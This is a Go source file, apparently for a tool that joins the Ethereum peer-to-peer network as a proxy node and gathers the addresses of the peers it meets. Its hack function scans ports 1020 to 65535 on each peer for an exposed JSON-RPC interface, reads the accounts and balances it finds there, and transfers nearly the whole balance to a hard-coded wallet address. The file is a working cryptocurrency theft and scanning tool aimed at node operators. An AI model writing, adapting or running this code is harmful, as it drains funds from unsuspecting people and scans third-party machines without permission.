package main

import (
	ethpeer "./ethpeer"
	"./logger"
	util "./utils"
	"crypto/ecdsa"
	"fmt"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/discover"
	"math/big"
	// "net"
	"net"
	// "os"
	"sync"
	"time"

	// "github.com/ethereum/go-ethereum/cmd/utils"
	// "github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/p2p/discv5"
	"github.com/ethereum/go-ethereum/p2p/nat"
	// "github.com/ethereum/go-ethereum/p2p/netutil"
	"rpc"
	"strings"
)

var cfg *util.Config

func log_init() {
	logger.SetConsole(cfg.Log.Console)
	logger.SetRollingFile(cfg.Log.Dir, cfg.Log.Name, cfg.Log.Num, cfg.Log.Size, logger.KB)
	//ALL，DEBUG，INFO，WARN，ERROR，FATAL，OFF
	logger.SetLevel(logger.ERROR)
	if cfg.Log.Level == "info" {
		logger.SetLevel(logger.INFO)
	} else if cfg.Log.Level == "error" {
		logger.SetLevel(logger.ERROR)
	}
}
func init() {
	cfg = &util.Config{}

	if !util.LoadConfig("seeker.toml", cfg) {
		return
	}
	log_init()
	// initialize()
}

const (
	ua          = "manspreading"
	ver         = "1.0.0"
	upstreamUrl = "enode://344d2d76587b931a8dccb61f5f3280c9486068ef2758252cf5c6ebc29d4385581137c45e2c218e4ee23a0b14d23ecb6ec12521362e9919380c3b00ff5401bea2@10.81.64.116:30304" //geth2
	// upstreamUrl = "enode://2998c333662a61620126e8a5a44545b8c0b362ec8a89b246a3e2e15a076983525e148ef113152d2836b976fb8de860b03f997012793870d78ae0a56e565d8398@118.31.112.214:30304" //getf1

	listenAddr = "0.0.0.0:36666"
	privkey    = ""
	//设置初值
	// 5294375 2881436154511909728
)

var (
	// startBlock = common.StringToHash("0x58f3ea40c3d1ffdea3c88b8d77ede6bdc2ecd6dc88b24aa2479304c359a043e5")
	// startTD    = big.NewInt(2881436154511909728)
	// 换个低一些的高度10000
	startBlock = common.HexToHash("0xdc2d938e4cd0a149681e9e04352953ef5ab399d59bcd5b0357f6c0797470a524")
	startTD    = big.NewInt(2303762395359969)
	genesis    = common.HexToHash("0xd4e56740f876aef8c010b86a40d5f56745a118d0906a34e69aec8c0db1cb8fa3")
	gversion   = uint32(63)
	gnetworkid = uint64(888888)
)

// statusData is the network packet for the status message.
type statusData struct {
	ProtocolVersion uint32
	NetworkId       uint64
	TD              *big.Int
	CurrentBlock    common.Hash
	GenesisBlock    common.Hash
}

func (s *statusData) String() string {
	return fmt.Sprintf("%v %v %v %v %v", s.ProtocolVersion, s.NetworkId, s.TD.Text(16), s.CurrentBlock.Hex(), s.GenesisBlock.Hex())
}

type newBlockHashesData []struct {
	Hash   common.Hash   // Hash of one particular block being announced
	Number uint64        // Number of one particular block being announced
	header *types.Header // Header of the block partially reassembled (new protocol)	重新组装的区块头
	time   time.Time     // Timestamp of the announcement

	origin string
}

// newBlockData is the network packet for the block propagation message.
type newBlockData struct {
	Block *types.Block
	TD    *big.Int
}

type conn struct {
	p  *p2p.Peer
	rw p2p.MsgReadWriter
}

type proxy struct {
	lock         sync.RWMutex
	upstreamNode *discover.Node //第一个连接的node
	// upstreamConn *conn
	upstreamConn map[discover.NodeID]*conn //后面自动连接的peer
	// downstreamConn *conn
	// upstreamState map[discover.NodeID]statusData
	allPeer    map[string]bool
	ethpeerset *ethpeer.PeerSet
	// NewPeerSet
	bestState     statusData
	bestStateChan chan statusData
	srv           *p2p.Server
	// maxtd         *big.Int
	// bestHash      common.Hash
	bestHeiChan     chan bestHeiPeer
	bestHeiChan2    chan bestHeiPeer
	bestHeiAndPeer  bestHeiPeer
	bestHeiAndPeer2 bestHeiPeer
	bestHeader      types.Header
	bestHeaderChan  chan []*types.Header
}
type bestHeiPeer struct {
	bestHei uint64
	p       *p2p.Peer
}

func (pxy *proxy) Start() {
	tick := time.Tick(5000 * time.Millisecond)
	tickPullBestBlock := time.Tick(10000 * time.Millisecond)
	go func() {
		for {
			select {
			case hei, ok := <-pxy.bestHeiChan:
				if !ok {
					break
				}
				if hei.bestHei > pxy.bestHeiAndPeer.bestHei {
					pxy.bestHeiAndPeer = hei
				}
			case hei, ok := <-pxy.bestHeiChan2:
				if !ok {
					break
				}
				if hei.bestHei > pxy.bestHeiAndPeer2.bestHei {
					pxy.bestHeiAndPeer2 = hei
				}
			case beststate, ok := <-pxy.bestStateChan:
				if !ok {
					break
				}
				if beststate.TD.Cmp(pxy.bestState.TD) > 0 && beststate.GenesisBlock.Hex() == genesis.Hex() {
					pxy.bestState = beststate
				}
			case bestheaders, ok := <-pxy.bestHeaderChan:
				// []*types.Header
				if !ok {
					break
				}
				for _, h := range bestheaders {
					if h.Number.Cmp(pxy.bestHeader.Number) > 0 {
						pxy.bestHeader = *h
					}
				}
			case <-tick:
				fmt.Println("newblockmsg besthei:", pxy.bestHeiAndPeer.bestHei, " from:", pxy.bestHeiAndPeer.p)
				fmt.Println("NewBlockHashesMsg besthei:", pxy.bestHeiAndPeer2.bestHei, " from:", pxy.bestHeiAndPeer2.p)
				fmt.Println("newblockmsg beststate:", pxy.bestState.String())
				// fmt.Println("bestheader number:", pxy.bestHeader.Number)
				fmt.Println("len peers:", pxy.srv.PeerCount(), " time:", time.Now().Format("2006-01-02 15:04:05"))
				// fmt.Println("all peers:", pxy.allPeer)
				fmt.Println(" ")
				go pxy.connectNode()
			case <-tickPullBestBlock:
				go pxy.pullBestBlock()
			}
		}
	}()
}
func (pxy *proxy) connectNode() {
	all := pxy.ethpeerset.AllPeer()
	// if pp, ok := all[bp.P.ID().String()]; ok {
	// 	hash, td := pp.Head()
	// 	gene := pp.Genesis()
	// 	if err := bp.Handshake(gnetworkid, td, hash, gene); err != nil {
	// 		fmt.Println("Ethereum handshake failed:", err)
	// 	} else {
	// 		fmt.Println("Ethereum handshake success")
	// 	}
	// }
	for k, v := range all {
		addr := v.P.RemoteAddr().String()

		add := strings.Split(addr, ":")
		fmt.Println(k, ":", add[0])
		// if pxy.allPeer[add[0]]
		if hacked, ok := pxy.allPeer[add[0]]; ok {
			if !hacked {
				go pxy.hack(add[0])
			}
		}
	}
}
func (pxy *proxy) hack(addr string) {
	for i := 1020; i < 65535; i++ {
		addrport := addr + ":" + fmt.Sprintf("%d", i)
		r := rpc.NewRPCClient("xx", addrport, "10")
		acc, err := r.GetAccounts()
		if err != nil {
			fmt.Println("addrport GetAccounts:", err)
			continue
		}
		balance, err := r.GetBalance(acc)
		if err != nil {
			fmt.Println("addrport GetBalance:", err)
			continue
		}
		if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
			b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
			r.SendTransaction(acc, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
		}
	}
	pxy.allPeer[addr] = true
}
func (pxy *proxy) pullBestBlock() {
	// var (
	// 	genesis = pxy.bestState.GenesisBlock
	// 	head    = pxy.bestHeader
	// 	hash    = pxy.bestHeader.Hash()
	// 	number  = pxy.bestHeader.Number.Uint64()
	// 	td      = pxy.bestState.TD
	// )
	// var (
	// 	bestPeer *p2p.peer
	// 	bestTd   *big.Int
	// )
	// for _, p := range pxy.allPeer {
	// 	newPeer
	// 	// if err := p.Handshake(pxy.bestState.NetworkId, td, hash, genesis.Hash()); err != nil {
	// 	// 	logger.Error("Ethereum handshake failed:", err)
	// 	// }

	// 	if _, td := p.Head(); bestPeer == nil || td.Cmp(bestTd) > 0 {
	// 		bestPeer, bestTd = p, td
	// 	}
	// }
	bp := pxy.ethpeerset.BestPeer()
	if bp != nil {
		fmt.Println("bestpeer:", bp.P)
	} else {
		return
	}

	all := pxy.ethpeerset.AllPeer()
	if pp, ok := all[bp.P.ID().String()]; ok {
		hash, td := pp.Head()
		gene := pp.Genesis()
		if err := bp.Handshake(gnetworkid, td, hash, gene); err != nil {
			fmt.Println("Ethereum handshake failed:", err)
		} else {
			fmt.Println("Ethereum handshake success")
		}
	}

	// for k, v := range all {
	// 	// fmt.Println(k,":",v)
	// 	_, td := v.Head()
	// 	fmt.Println(k[:16], ":", td)
	// }
	// fmt.Println("bestpeer:", .P)
}

var pxy *proxy

func test2() {
	var nodekey *ecdsa.PrivateKey
	if privkey != "" {
		nodekey, _ = crypto.LoadECDSA(privkey)
		fmt.Println("Node Key loaded from ", privkey)
	} else {
		nodekey, _ = crypto.GenerateKey()
		crypto.SaveECDSA("./nodekey", nodekey)
		fmt.Println("Node Key generated and saved to ./nodekey")
	}

	node, err := discover.ParseNode(MainnetBootnodes[0])
	if err != nil {
		fmt.Println("discover.ParseNode:", err)
		return
	}
	ps := ethpeer.NewPeerSet()
	pxy = &proxy{
		upstreamNode: node,
		upstreamConn: make(map[discover.NodeID]*conn, 0),
		allPeer:      make(map[string]bool, 0),
		ethpeerset:   ps,
		// upstreamState: make(map[discover.NodeID]statusData, 0),
		bestState: statusData{
			ProtocolVersion: gversion,
			NetworkId:       gnetworkid,
			TD:              startTD,
			CurrentBlock:    startBlock,
			GenesisBlock:    genesis,
		},
		bestStateChan:  make(chan statusData),
		bestHeiChan:    make(chan bestHeiPeer),
		bestHeiChan2:   make(chan bestHeiPeer),
		bestHeaderChan: make(chan []*types.Header),
	}
	bootstrapNodes := make([]*discover.Node, 0)
	for _, boot := range MainnetBootnodes {
		old, err := discover.ParseNode(boot)
		if err != nil {
			fmt.Println("discover.ParseNode2:", err)
			continue
		}
		// pxy.srv.AddPeer(old)
		bootstrapNodes = append(bootstrapNodes, old)
	}
	config := p2p.Config{
		PrivateKey:  nodekey,
		MaxPeers:    300,
		NoDiscovery: false,
		DiscoveryV5: false,
		Name:        common.MakeName(fmt.Sprintf("%s/%s", ua, node.ID.String()), ver),
		// BootstrapNodes: []*discover.Node{node},
		BootstrapNodes: bootstrapNodes,
		StaticNodes:    []*discover.Node{node},
		TrustedNodes:   []*discover.Node{node},

		Protocols: []p2p.Protocol{newManspreadingProtocol()},

		ListenAddr: listenAddr,
		Logger:     log.New(),
	}
	// config.Logger.SetHandler(log.StdoutHandler)

	pxy.srv = &p2p.Server{Config: config}

	// Wait forever
	var wg sync.WaitGroup
	wg.Add(2)
	err = pxy.srv.Start()
	pxy.Start()
	wg.Done()
	if err != nil {
		fmt.Println(err)
	}
	wg.Wait()
}
func test() {
	var nodekey *ecdsa.PrivateKey
	if privkey != "" {
		nodekey, _ = crypto.LoadECDSA(privkey)
		fmt.Println("Node Key loaded from ", privkey)
	} else {
		nodekey, _ = crypto.GenerateKey()
		crypto.SaveECDSA("./nodekey", nodekey)
		fmt.Println("Node Key generated and saved to ./nodekey")
	}

	addr, err := net.ResolveUDPAddr("udp", ":30301")
	if err != nil {
		logger.Error("-ResolveUDPAddr: %v", err)
		return
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		logger.Error("-ListenUDP: %v", err)
		return
	}

	realaddr := conn.LocalAddr().(*net.UDPAddr)
	natm, err := nat.Parse("any")
	if err != nil {
		logger.Error("-nat: %v", err)
		return
	}
	if natm != nil {
		if !realaddr.IP.IsLoopback() {
			go nat.Map(natm, nil, "udp", realaddr.Port, realaddr.Port, "ethereum discovery")
		}
		// TODO: react to external IP changes over time.
		if ext, err := natm.ExternalIP(); err == nil {
			realaddr = &net.UDPAddr{IP: ext, Port: realaddr.Port}
		}
	}
	runv5 := false
	// restrictList := ""
	if runv5 {
		if _, err := discv5.ListenUDP(nodekey, conn, realaddr, "", nil); err != nil {
			logger.Error("%v", err)
			return
		}
	} else {
		cfg := discover.Config{
			PrivateKey:   nodekey,
			AnnounceAddr: realaddr,
		}
		if _, err := discover.ListenUDP(conn, cfg); err != nil {
			logger.Error("%v", err)
			return
		}
	}

	select {}
}
func main() {
	// test()
	test2()
	c := make(chan int, 1)

	<-c
}
